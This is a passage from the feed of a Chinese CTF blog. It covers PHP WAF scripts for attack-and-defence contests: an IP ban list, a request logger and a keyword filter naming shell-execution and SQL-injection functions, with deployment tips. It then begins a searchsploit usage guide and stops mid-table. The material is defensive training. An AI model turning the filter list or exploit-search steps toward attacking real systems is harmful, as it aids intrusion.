punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>\t<span class=\"token variable\">$log_path</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$log_file_path</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>\t<span class=\"token variable\">$f</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$log_path</span><span class=\"token punctuation\">,</span><span class=\"token string single-quoted-string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>\t<span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">,</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token operator\">.</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$flow</span><span class=\"token punctuation\">,</span><span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>\t<span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre><span class=\"token comment\">/**</pre></td></tr><tr><td data-num=\"39\"></td><td><pre> * [banIP IP 封禁模块]</pre></td></tr><tr><td data-num=\"40\"></td><td><pre> * @return [type] [description]</pre></td></tr><tr><td data-num=\"41\"></td><td><pre> */</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">banIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>\t<span class=\"token keyword\">global</span> <span class=\"token variable\">$blackIp</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">is_file</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'black.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>\t\t<span class=\"token variable\">$blackIp</span> <span class=\"token operator\">=</span> <span class=\"token function\">array_filter</span><span class=\"token punctuation\">(</span><span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"\\n\"</span><span class=\"token punctuation\">,</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'black.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>\t<span class=\"token variable\">$userIP</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REMOTE_ADDR'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>\t<span class=\"token variable\">$_not_found</span> <span class=\"token operator\">=</span> <span class=\"token string heredoc-string\"><span class=\"token delimiter symbol\"><span class=\"token punctuation\">&lt;&lt;&lt;</span>END</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>&lt;!DOCTYPE html PUBLIC '-//IETF//DTD HTML 2.0//EN'></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>&lt;html>&lt;head></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>&lt;meta http-equiv='content-type' content='text/html; charset=windows-1252'></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>&lt;title>404 Not Found&lt;/title></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>&lt;/head>&lt;body></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>&lt;h1>Not Found&lt;/h1></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>&lt;p>The requested URL / was not found on this server.&lt;/p></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>&lt;/body></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>&lt;/html></pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token delimiter symbol\">END<span class=\"token punctuation\">;</span></span></span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>\t<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$userIP</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$blackIp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>\t\t<span class=\"token variable\">$staus_code</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"HTTP/1.1 404 Not Found\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>\t\t<span class=\"token function\">header</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$staus_code</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>\t\t<span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_not_found</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>\t<span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token function\">access</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre><span class=\"token function\">banIP</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p><a href=\"https://github.com/sharpleung/CTF-WAF\">项目地址及官方文档</a></p>\n<div class=\"tab\" data-id=\"id1\" data-title=\"waf脚本2\">\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">define</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'LOG_FILENAME'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'log.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>    </pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">function_exists</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'getallheaders'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_SERVER</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$name</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token string single-quoted-string\">'HTTP_'</span><span class=\"token punctuation\">)</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">[</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'-'</span><span class=\"token punctuation\">,</span> <span class=\"token function\">ucwords</span><span class=\"token punctuation\">(</span><span class=\"token function\">strtolower</span><span class=\"token punctuation\">(</span><span class=\"token function\">str_replace</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'_'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">' '</span><span class=\"token punctuation\">,</span> <span class=\"token function\">substr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$name</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token variable\">$headers</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token variable\">$get</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$post</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_POST</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token variable\">$cookie</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token function\">getallheaders</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token variable\">$files</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token variable\">$ip</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"REMOTE_ADDR\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token variable\">$method</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'REQUEST_METHOD'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token variable\">$filepath</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_SERVER</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"SCRIPT_NAME\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\">//rewirte shell which uploaded by others, you can do more</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$key</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token variable\">$files</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'content'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'tmp_name'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"virink\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'Accept'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">//fix a bug</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token variable\">$input</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Get\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$get</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Post\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$post</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Cookie\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$cookie</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"File\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token string double-quoted-string\">\"Header\"</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$header</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token comment\">//deal with</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    <span class=\"token variable\">$pattern</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select|insert|update|delete|and|or|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|load_file|outfile|dumpfile|sub|hex\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"|file_put_contents|fwrite|curl|system|eval|assert\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    <span class=\"token variable\">$pattern</span><span class=\"token operator\">.=</span> <span class=\"token string double-quoted-string\">\"|`|dl|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token variable\">$vpattern</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"|\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$pattern</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    <span class=\"token variable\">$bool</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$k</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>        <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$vpattern</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$value</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">foreach</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token keyword\">as</span> <span class=\"token variable\">$kk</span> <span class=\"token operator\">=></span> <span class=\"token variable\">$vv</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/<span class=\"token interpolation\"><span class=\"token variable\">$value</span></span>/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$vv</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>                    <span class=\"token variable\">$bool</span> <span class=\"token operator\">=</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                    <span class=\"token function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$input</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>                    <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>                <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$bool</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">break</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre><span class=\"token keyword\">function</span> <span class=\"token function-definition function\">logging</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    <span class=\"token function\">date_default_timezone_set</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Asia/Shanghai\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 修正时间为中国准确时间</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>    <span class=\"token variable\">$time</span><span class=\"token operator\">=</span><span class=\"token function\">date</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Y-m-d H:i:s\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">// 将时间赋值给变量 $time</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>    <span class=\"token function\">file_put_contents</span><span class=\"token punctuation\">(</span><span class=\"token constant\">LOG_FILENAME</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"\\r\\n\\r\\n\\r\\n\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$time</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\"\\r\\n\"</span> <span class=\"token operator\">.</span> <span class=\"token function\">print_r</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$var</span><span class=\"token punctuation\">,</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token constant\">FILE_APPEND</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">unset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_COOKIE</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>  </pre></td></tr><tr><td data-num=\"61\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token function\">waf</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure></div>\n</div>\n</div>\n<p><span class=\"spoiler\" title=\"你知道得太多了\">个人感觉第二个脚本好用些</span></p>\n<h2 id=\"waf部署方式\"><a class=\"anchor\" href=\"#waf部署方式\">#</a> waf 部署方式：</h2>\n<h3 id=\"有root权限\"><a class=\"anchor\" href=\"#有root权限\">#</a> 有 root 权限</h3>\n<p><mark>php.ini 设置</mark></p>\n<p>一般路径在 <code>/etc/php/&#123;版本号&#125;/apache2/php.ini</code> ，也可以这样找： <code>php -i | grep &quot;php.ini&quot;</code></p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>php.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>auto_prepend_file &#x3D; &#x2F;var&#x2F;www&#x2F;html&#x2F;waf.php</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>auto_append_file &#x3D; &#x2F;var&#x2F;www&#x2F;html&#x2F;waf.php</pre></td></tr></table></figure><p>保存后 <code>sudo service apache2 restart</code> ，重启 apache 服务</p>\n<p>或者写在 .user.ini 或者 .htaccess 中。</p>\n<figure class=\"highlight raw\"><figcaption data-lang=\"\"><span>.htaccess/.user.ini</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre>php_value auto_prepend_file “&#x2F;dir&#x2F;path&#x2F;phpwaf.php”</pre></td></tr></table></figure><h3 id=\"只有某一普通用户的权限\"><a class=\"anchor\" href=\"#只有某一普通用户的权限\">#</a> 只有某一普通用户的权限</h3>\n<p>在 /var/www/html 的 index.php 中添加</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">include_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'waf.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> </pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">require_once</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'waf.php'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 不显示报错信息</span></pre></td></tr></table></figure><h2 id=\"找到cms框架通用配置文件进行包含\"><a class=\"anchor\" href=\"#找到cms框架通用配置文件进行包含\">#</a> 找到 CMS / 框架通用配置文件进行包含：</h2>\n<blockquote>\n<p>PHPCMS V9：\\phpcms\\base.php<br />\nPHPWIND8.7：\\data\\sql_config.php<br />\nDEDECMS5.7：\\data\\common.inc.php<br />\nDiscuzX2：\\config\\config_global.php<br />\nWordPress：\\wp-config.php<br />\nMetinfo：\\include\\head.php</p>\n</blockquote>\n",
            "tags": [
                "AWD",
                "Attack and Defence"
            ]
        },
        {
            "id": "https://ctf-learner.github.io/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/",
            "url": "https://ctf-learner.github.io/post/%E4%B8%8D%E4%BC%9A%E5%B0%B1%E6%90%9Csearchsploit/",
            "title": "不会就搜searchsploit",
            "date_published": "2024-04-19T11:52:08.000Z",
            "content_html": "<p><span class=\"label success\">上次更新时间：2024-04-19</span></p>\n<h1 id=\"searchsploit离线工具\"><a class=\"anchor\" href=\"#searchsploit离线工具\">#</a> searchsploit 离线工具</h1>\n<blockquote>\n<ul class=\"lvl-1\">\n<li class=\"lvl-2\">“searchsploit” 是一个用于 Exploit-DB 的命令行搜索工具，它还允许你随身带一份 Exploit-DB 的副本。</li>\n<li class=\"lvl-2\">SearchSploit 提供了在本地保存的存储库中执行详细的离线搜索的能力。</li>\n<li class=\"lvl-2\">许多漏洞都包含了二进制文件的链接，这些文件不包含在标准存储库中，但可以在 Exploit-DB 二进制文件中找到。</li>\n</ul>\n</blockquote>\n<h1 id=\"更新searchsploit\"><a class=\"anchor\" href=\"#更新searchsploit\">#</a> 更新 searchsploit</h1>\n<div class=\"note warning\">\n<p><strong>线下 AWD 开赛前，记得跟新 searchsploit!</strong></p>\n</div>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">apt</span> update <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">apt</span> <span class=\"token parameter variable\">-y</span> full-upgrade</pre></td></tr><tr><td data-num=\"2\"></td><td><pre>searchsploit <span class=\"token parameter variable\">-u</span></pre></td></tr></table></figure><h1 id=\"searchsploit命令使用\"><a class=\"anchor\" href=\"#searchsploit命令使用\">#</a> searchsploit 命令使用</h1>\n<table>\n<thead>\n<tr>\n<th style=\"text-align:center\">选项</th>\n<th style=\"text-align:center\">功能</th>\n<th style=\"text-align:left\">例如</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">-u</td>\n<td style=\"text-align:center\">检查并安装任何 exploitdb 软件包更新</td>\n<td style=\"text-align:left\">searchsploit -u</td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-t</td>\n<td style=\"text-align:center\">仅对标题搜索</td>\n<td style=\"text-align:left\"><code>searchsploit -t smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-p</td>\n<td style=\"text-align:center\">显示漏洞利用的完整路径，将路径复制到剪贴板</td>\n<td style=\"text-align:left\"><code>searchsploit -p 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\"><span class=\"red\">-m</span></td>\n<td style=\"text-align:center\">复制到当前工作目录，同时获取漏洞的具体信息</td>\n<td style=\"text-align:left\"><code>searchsploit -m 42315.py</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-w</td>\n<td style=\"text-align:center\">联网搜索</td>\n<td style=\"text-align:left\"><code>searchsploit -w smb windows remote</code></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">-j</td>\n<td style=\"text-align:center\">以 json 格式显示</td>\n<td 